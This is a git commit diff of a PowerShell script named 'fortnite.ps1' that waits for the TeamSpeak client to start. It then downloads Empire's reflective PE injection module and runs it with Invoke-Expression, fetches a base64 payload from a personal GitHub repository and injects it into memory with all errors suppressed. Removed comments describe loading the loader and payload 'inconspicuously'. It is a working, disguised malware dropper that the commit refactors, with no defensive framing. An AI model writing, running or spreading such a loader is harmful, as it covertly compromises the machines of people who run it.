6e855469f3f011e88ceed730b41a1517771c5798
spritezerosugar67 <apfelgamer1@gmail.com>
2026-01-09 10:20:27 +0100

    Refactor script to use WebClient for downloads

--- fortnite.ps1
+++ fortnite.ps1
@@ -1,28 +1,24 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Warten auf TeamSpeak
-while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
+while (!(Get-Process ts3client_win64)) { 
+    Start-Sleep -Seconds 2 
+}
+
 Start-Sleep -Seconds 5 
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 3072
+    $wc = New-Object System.Net.WebClient
     
-    # 1. Loader unauffällig laden
-    $lUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
-    $l = (iwr -UseBasicParsing $lUrl).Content
+    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
     Invoke-Expression $l
 
-    # 2. Payload unauffällig laden
-    $pUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
-    $b = (iwr -UseBasicParsing $pUrl).Content
-    
-    # Säubern des Strings (entfernt unsichtbare Zeichen, die den Fehler verursachen)
-    $b = $b.Trim()
+    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
     $rb = [System.Convert]::FromBase64String($b)
 
-    # 3. Injektion explizit auf TS3 ausrichten
-    $target = Get-Process ts3client_win64
-    Invoke-ReflectivePEInjection -PEBytes $rb -ProcId $target.Id -ForceASLR
+    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
 } catch {
 }
+
+# Khiro wer das liest LG
 exit
